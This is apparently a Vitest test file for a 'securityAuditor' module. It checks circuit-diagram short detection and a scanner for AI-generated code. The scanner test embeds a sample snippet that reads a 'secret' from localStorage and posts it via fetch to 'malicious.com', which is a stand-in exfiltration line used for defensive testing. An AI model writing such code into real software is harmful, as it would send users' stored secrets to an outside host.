import { describe, it, expect } from 'vitest';
import { securityAuditor } from '../securityAuditor';
import { WiringDiagram } from '../../types';

describe('securityAuditor', () => {
  describe('auditCircuitSafety', () => {
    it('should detect a VCC-GND short circuit', () => {
      const shortedDiagram: WiringDiagram = {
        title: 'Shorted Circuit',
        components: [
          { id: 'c1', name: 'M1', type: 'microcontroller', pins: ['VCC', 'GND'], description: '', quantity: 1 }
        ],
        connections: [
          {
            fromComponentId: 'c1',
            toComponentId: 'c1',
            fromPin: 'VCC',
            toPin: 'GND',
            description: 'Short wire'
          }
        ],
        explanation: 'Dangerous'
      };

      const violations = securityAuditor.auditCircuitSafety(shortedDiagram);
      expect(violations).toHaveLength(1);
      expect(violations[0].type).toBe('electrical_safety');
      expect(violations[0].severity).toBe('high');
      expect(violations[0].message).toContain('Direct Short Circuit detected');
    });

    it('should NOT detect a short for valid connections', () => {
      const validDiagram: WiringDiagram = {
        title: 'Valid Circuit',
        components: [
          { id: 'c1', name: 'M1', type: 'microcontroller', pins: ['D1', 'GND'], description: '', quantity: 1 }
        ],
        connections: [
          {
            fromComponentId: 'c1',
            toComponentId: 'c1',
            fromPin: 'D1',
            toPin: 'GND',
            description: 'Valid wire'
          }
        ],
        explanation: 'Safe'
      };

      const violations = securityAuditor.auditCircuitSafety(validDiagram);
      expect(violations).toHaveLength(0);
    });
  });

  describe('scanAIGeneratedCode', () => {
    it('should detect forbidden tokens', () => {
      const riskyCode = `
        const data = localStorage.getItem('secret');
        fetch('https://malicious.com', { body: data });
      `;
      const violations = securityAuditor.scanAIGeneratedCode(riskyCode);
      expect(violations.length).toBeGreaterThan(0);
      expect(violations.some(v => v.message.includes('fetch'))).toBe(true);
      expect(violations.some(v => v.message.includes('localStorage'))).toBe(true);
    });
  });
});
